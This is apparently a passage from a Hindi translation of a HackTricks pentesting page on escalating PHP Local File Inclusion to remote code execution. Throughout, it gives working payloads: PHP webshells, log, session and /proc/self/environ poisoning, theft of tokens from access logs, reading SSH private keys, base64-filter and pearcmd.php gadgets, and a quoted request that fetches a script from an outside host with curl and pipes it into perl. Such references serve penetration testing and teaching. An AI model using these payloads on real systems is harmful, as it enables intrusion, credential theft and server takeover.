- traversal/LFI का उपयोग करके web server access log पढ़ें। सामान्य स्थान:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- कुछ endpoints file reads को Base64-encoded के रूप में लौटाते हैं। यदि ऐसा है, तो स्थानीय रूप से decode करें और log lines का निरीक्षण करें।
- GET requests जिनमें token parameter शामिल है, उन पर Grep करें और उसका value capture करें, फिर उसे application entry point पर replay करें।

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
यदि body Base64 में है, तो इसे डिकोड करें, फिर कैप्चर किया गया token replay करें:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
नोट्स:
- Tokens इन URLs में डिफ़ॉल्ट रूप से लॉग होते हैं; production systems में कभी bearer tokens को GET के माध्यम से स्वीकार न करें।
- यदि ऐप कई token नामों का समर्थन करता है, तो AuthenticationToken, token, sid, access_token जैसे सामान्य keys की तलाश करें।
- जो भी tokens logs में leaked हुए हों, उन्हें rotate करें।

### ईमेल के माध्यम से

**एक मेल भेजें** एक internal account (user@localhost) को जिसमें आपका PHP payload जैसे `<?php echo system($_REQUEST["cmd"]); ?>` हो, और उपयोगकर्ता के मेल को **`/var/mail/<USERNAME>`** या **`/var/spool/mail/<USERNAME>`** जैसे path से include करने की कोशिश करें।

### /proc/\*/fd/\* के माध्यम से

1. बहुत सारे shells अपलोड करें (उदाहरण के लिए: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), जहाँ $PID प्रोसेस का PID है (can be brute forced) और $FD file descriptor है (इसे भी brute forced किया जा सकता है)

### /proc/self/environ के माध्यम से

लॉग फ़ाइल की तरह, payload को User-Agent में भेजें, यह /proc/self/environ फ़ाइल के अंदर प्रतिबिंबित होगा।
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### के द्वारा upload

अगर आप एक file upload कर सकते हैं, तो बस उसमें shell payload inject कर दें (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
फ़ाइल को पठनीय बनाए रखने के लिए सबसे अच्छा है कि चित्रों/doc/pdf की metadata में inject किया जाए

### ZIP file अपलोड के माध्यम से

एक ZIP file अपलोड करें जिसमें एक compressed PHP shell शामिल हो और उसे access करें:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP sessions के माध्यम से

जाँच करें कि वेबसाइट PHP Session (PHPSESSID) का उपयोग करती है
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP में ये sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ files में स्टोर होते हैं
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie को `<?php system('cat /etc/passwd');?>` में सेट करें
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
PHP session file को include करने के लिए LFI का उपयोग करें
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh के माध्यम से

यदि ssh सक्रिय है तो जांचें कि कौन सा user उपयोग हो रहा है (/proc/self/status & /etc/passwd) और प्रयास करें **\<HOME>/.ssh/id_rsa** तक पहुँचने की।

### **के माध्यम से** **vsftpd** _**लॉग्स**_

FTP server vsftpd के लॉग _**/var/log/vsftpd.log**_ में स्थित हैं। यदि Local File Inclusion (LFI) vulnerability मौजूद है और exposed vsftpd server तक पहुँच संभव है, तो निम्नलिखित कदम अपनाए जा सकते हैं:

1. Login प्रक्रिया के दौरान username field में एक PHP payload inject करें।
2. Injection के बाद, LFI का उपयोग करके server logs को _**/var/log/vsftpd.log**_ से प्राप्त करें।

### php base64 filter के माध्यम से (base64 का उपयोग करते हुए)

As shown in [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article, PHP base64 filter सिर्फ Non-base64 को ignore कर देता है। आप इसका उपयोग file extension check bypass करने के लिए कर सकते हैं: यदि आप ऐसा base64 प्रदान करते हैं जो ".php" पर खत्म होता है, तो यह "." को अनदेखा कर देगा और base64 में "php" जोड़ देगा। यहाँ एक उदाहरण payload है:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters के जरिए (किसी फ़ाइल की ज़रूरत नहीं)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) बताती है कि आप आउटपुट के रूप में **php filters का उपयोग करके मनमाना कंटेंट उत्पन्न कर सकते हैं**। जिसका मूलतः मतलब यह है कि आप include के लिए **मनमाना php कोड उत्पन्न कर सकते हैं** बिना इसे किसी फ़ाइल में **लिखने की ज़रूरत** के।

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault के जरिए

**Upload** करें एक फ़ाइल जो `/tmp` में **temporary** के रूप में स्टोर होगी, फिर उसी **same request** में एक **segmentation fault** ट्रिगर करें, और फिर वह **temporary file won't be deleted** होगी और आप उसे खोज सकते हैं।

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage के जरिए

यदि आपको **Local File Inclusion** मिला है और **Nginx** PHP के सामने चल रहा है तो आप निम्नलिखित तकनीक से RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS के जरिए

यदि आपको **Local File Inclusion** मिला है भले ही आपके पास **session न हो** और `session.auto_start` `Off` हो। यदि आप **`PHP_SESSION_UPLOAD_PROGRESS`** को **multipart POST** डेटा में प्रदान करते हैं, तो PHP आपके लिए **session को enable** कर देगा। आप इसे दुरुपयोग करके RCE हासिल कर सकते हैं:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows में temp file uploads के जरिए

यदि आपको **Local File Inclusion** मिला है और सर्वर **Windows** पर चल रहा है तो आपको RCE मिल सकता है:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args के जरिए

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), स्क्रिप्ट `/usr/local/lib/phppearcmd.php` php docker images में डिफ़ॉल्ट रूप से मौजूद होती है। इसके अलावा, URL के जरिए स्क्रिप्ट को arguments पास करना संभव है क्योंकि यह संकेत दिया गया है कि अगर किसी URL param में `=` नहीं है तो उसे argument के रूप में इस्तेमाल किया जाना चाहिए। देखें भी [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) और [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)।

निम्न अनुरोध `/tmp/hello.php` में `<?=phpinfo()?>` सामग्री वाली एक फ़ाइल बनाएगा:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
निम्नलिखित CRLF vuln का दुरुपयोग करके RCE प्राप्त करता है (स्रोत: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() (file_uploads = on) के माध्यम से

यदि आपने एक **Local File Inclusion** और एक फ़ाइल पाई जो **phpinfo()** दिखाती है और file_uploads = on है, तो आप RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure के माध्यम से

यदि आपने एक **Local File Inclusion** पाया है और आप temp फ़ाइल का **can exfiltrate the path** कर सकते हैं लेकिन **server** यह **checking** कर रहा है कि **file to be included has PHP marks**, तो आप इस **Race Condition** के साथ उस जाँच को **bypass that check** करने की कोशिश कर सकते हैं:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce के माध्यम से

यदि आप LFI का दुरुपयोग करके **upload temporary files** कर सकते हैं और सर्वर को PHP निष्पादन **hang** करवा सकते हैं, तो आप कुछ घंटों तक **brute force filenames during hours** करके temporary फ़ाइल ढूंढ सकते हैं:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error के लिए

यदि आप किसी भी फ़ाइल को include करते हैं `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`। (उस त्रुटि को throw करने के लिए आपको वही एक फ़ाइल 2 बार include करनी होगी)।

**मुझे नहीं पता कि यह किस तरह उपयोगी है पर यह संभवतः उपयोगी हो सकता है।**\
_भले ही आप एक PHP Fatal Error पैदा कर दें, अपलोड की गई PHP temporary फ़ाइलें हटाई जा देती हैं।_

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
